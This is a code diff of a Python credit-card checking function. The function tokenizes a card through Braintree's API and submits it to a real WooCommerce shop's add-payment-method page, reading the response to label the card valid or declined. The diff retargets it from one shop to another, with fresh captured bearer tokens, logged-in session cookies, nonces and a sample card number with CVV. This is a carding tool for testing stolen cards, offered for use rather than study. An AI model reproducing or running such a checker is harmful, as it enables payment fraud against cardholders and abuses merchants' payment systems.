@@ -20,18 +20,21 @@ def chk(card):
 	
 	r = requests.session()
 	
-	r.verify = False
-	
-	user = user_agent.generate_user_agent()
-	
-	
+
+
+
+
+
+
+
+
 
 
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjAxMTE4MjMsImp0aSI6IjY2MWIxNTdiLWNjZGItNDJkNi1hOTJhLTBmYzU4ZjkyYTdiZSIsInN1YiI6Inc5bnI1cHM2anluZGZ3Z24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Inc5bnI1cHM2anluZGZ3Z24iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.5aBqrpa80w12miEuJ6q6vk7FVDnp7R1KVlj5V4EW7KqXlhA0M_O3LifOZraOHcOvwtmz4FuwBvSUxg0uXlovDA',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjAzNzYyNjAsImp0aSI6IjVlYzEwOTE0LWNkYmItNDFhMS05NmY0LTc2YzRiOTc5YzkxMyIsInN1YiI6IjY1ZjcydHpuZHN3amY0cWYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjY1ZjcydHpuZHN3amY0cWYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319.Kmn2TNq-wbvihDtRe3WDtZD8XOLi7zpiCzFBJVE5zVZPdKpSUQu-YGkWcV5sy9M7Dl9dlbippayc2pwXOvDE5g',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -51,7 +54,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': 'f8da52c9-8f14-44a9-a777-3b9a94920196',
+        'sessionId': '2a15223c-299d-485d-bd93-b2ac817cdc18',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -74,43 +77,45 @@ def chk(card):
 
 # Note: json_data will not be serialized by requests
 # exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"f8da52c9-8f14-44a9-a777-3b9a94920196"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5115581818109910","expirationMonth":"06","expirationYear":"2025","cvv":"291"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"2a15223c-299d-485d-bd93-b2ac817cdc18"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4403934237294603","expirationMonth":"12","expirationYear":"2027","cvv":"743"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
 #response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
-	
+
 	tok = response.json()['data']['tokenizeCreditCard']['token']
-	
-	
-	
-	
-	
+
+
+
+
+
+
+
+
 
 
 	cookies = {
-    '_ga': 'GA1.1.242160314.1719582147',
-    'eucookielaw': '1735134150572',
-    'wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29': 'bbxbcbb.hhxbfbb%7C1720792129%7C8odriFhtxbPDoz2Iovc0jlupR28BkhASWdY4Q2m5bu2%7Cb58ffc1abe2e70bb1d440862e729e54d1db90a286eff64bc68a5e40a4b185f26',
-    '_ga_EX1GV7CW1V': 'GS1.1.1719582147.1.1.1719582533.0.0.0',
-    'wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197': '196%7Cother%7Cread%7C867653c136a136da0c63887384dd3490914da40d810b0baff069a264b9cbc19a',
+    '_fbp': 'fb.1.1719845019955.442683768755068518',
+    'wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4': 'moh552vbnm%7C1721054638%7CCg9gMArsIb5k9DbSJw6zUCvVQyefmehrzNo7HpUn8Ve%7C3bd3670604f63c703ddfe15aa8832924a2d4d427c3092680dbf3b86d0107aaa9',
+    'wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4': 'rls6ud2drfgdm3pfq0ko',
+    'wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788': '43697%7Cother%7Cread%7Ca74c524fcae83e1a18c6ac72ae7cd3cb0457b632495212af4cfca72f19533152',
+    'wp_automatewoo_session_started': '1',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-07-03%2016%3A47%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2024-07-03%2016%3A47%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current_add': 'fd%3D2024-07-06%2018%3A17%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-07-06%2018%3A17%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    '_ga_347410393': 'GS1.1.1720025273.7.0.1720025279.0.0.0',
-    'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
 }
 
 	headers = {
-    'authority': 'www.carolyngibbsquilts.co.uk',
+    'authority': 'alphawolfnutrition.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': '_ga=GA1.1.242160314.1719582147; eucookielaw=1735134150572; wordpress_logged_in_8f9b66474434421691b2f5f503bb4c29=bbxbcbb.hhxbfbb%7C1720792129%7C8odriFhtxbPDoz2Iovc0jlupR28BkhASWdY4Q2m5bu2%7Cb58ffc1abe2e70bb1d440862e729e54d1db90a286eff64bc68a5e40a4b185f26; _ga_EX1GV7CW1V=GS1.1.1719582147.1.1.1719582533.0.0.0; wfwaf-authcookie-a93ed5df29f1287f22c954ebbd632197=196%7Cother%7Cread%7C867653c136a136da0c63887384dd3490914da40d810b0baff069a264b9cbc19a; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-03%2016%3A47%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-03%2016%3A47%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _ga_347410393=GS1.1.1720025273.7.0.1720025279.0.0.0; sbjs_session=pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.carolyngibbsquilts.co.uk%2Fmy-account%2Fadd-payment-method%2F',
-    'origin': 'https://www.carolyngibbsquilts.co.uk',
+    # 'cookie': '_fbp=fb.1.1719845019955.442683768755068518; wordpress_logged_in_5bb3b822b32877fbbb0b41afc4e7a0c4=moh552vbnm%7C1721054638%7CCg9gMArsIb5k9DbSJw6zUCvVQyefmehrzNo7HpUn8Ve%7C3bd3670604f63c703ddfe15aa8832924a2d4d427c3092680dbf3b86d0107aaa9; wp_automatewoo_visitor_5bb3b822b32877fbbb0b41afc4e7a0c4=rls6ud2drfgdm3pfq0ko; wfwaf-authcookie-25767dd5057cfb43b33a8119850c7788=43697%7Cother%7Cread%7Ca74c524fcae83e1a18c6ac72ae7cd3cb0457b632495212af4cfca72f19533152; wp_automatewoo_session_started=1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-06%2018%3A17%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-07-06%2018%3A17%3A36%7C%7C%7Cep%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Falphawolfnutrition.com%2Fmy-account%2Fadd-payment-method%2F',
+    'origin': 'https://alphawolfnutrition.com',
     'pragma': 'no-cache',
-    'referer': 'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
+    'referer': 'https://alphawolfnutrition.com/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -123,38 +128,35 @@ def chk(card):
 }
 
 	data = [
-    ('wc_braintree_paypal_payment_nonce', ''),
-    ('wc_braintree_device_data', '{"correlation_id":"a39edd72287e0d7fe6b15f8f891deef2"}'),
-    ('wc-braintree-paypal-context', 'shortcode'),
-    ('wc_braintree_paypal_amount', '0.00'),
-    ('wc_braintree_paypal_currency', 'GBP'),
-    ('wc_braintree_paypal_locale', 'en_gb'),
-    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
     ('payment_method', 'braintree_credit_card'),
-    ('wc-braintree-credit-card-card-type', 'master-card'),
+    ('wc-braintree-credit-card-card-type', 'visa'),
     ('wc-braintree-credit-card-3d-secure-enabled', ''),
     ('wc-braintree-credit-card-3d-secure-verified', ''),
     ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
     ('wc_braintree_credit_card_payment_nonce', tok,),
-    ('wc_braintree_device_data', '{"correlation_id":"a39edd72287e0d7fe6b15f8f891deef2"}'),
+    ('wc_braintree_device_data', '{"correlation_id":"a278ebf2bd07dd85761453814581ecae"}'),
     ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
-    ('woocommerce-add-payment-method-nonce', '18824bb10b'),
+    ('wc_braintree_paypal_payment_nonce', ''),
+    ('wc_braintree_device_data', '{"correlation_id":"a278ebf2bd07dd85761453814581ecae"}'),
+    ('wc-braintree-paypal-context', 'shortcode'),
+    ('wc_braintree_paypal_amount', '0.00'),
+    ('wc_braintree_paypal_currency', 'USD'),
+    ('wc_braintree_paypal_locale', 'en_us'),
+    ('wc-braintree-paypal-tokenize-payment-method', 'true'),
+    ('woocommerce-add-payment-method-nonce', '03f8d0163f'),
     ('_wp_http_referer', '/my-account/add-payment-method/'),
     ('woocommerce_add_payment_method', '1'),
 ]
 
 	response = requests.post(
-    'https://www.carolyngibbsquilts.co.uk/my-account/add-payment-method/',
+    'https://alphawolfnutrition.com/my-account/add-payment-method/',
     cookies=cookies,
     headers=headers,
     data=data,
 )
-	
-	
 	text = response.text
 	
 	pattern = r'Status code (.*?)\s*</li>'
-	
 	
 	match = re.search(pattern, text)
 	if match:
@@ -167,6 +169,7 @@ def chk(card):
 		else:
 			result = "Error"
 			
-	
-				
 	return result
+	
+
+	
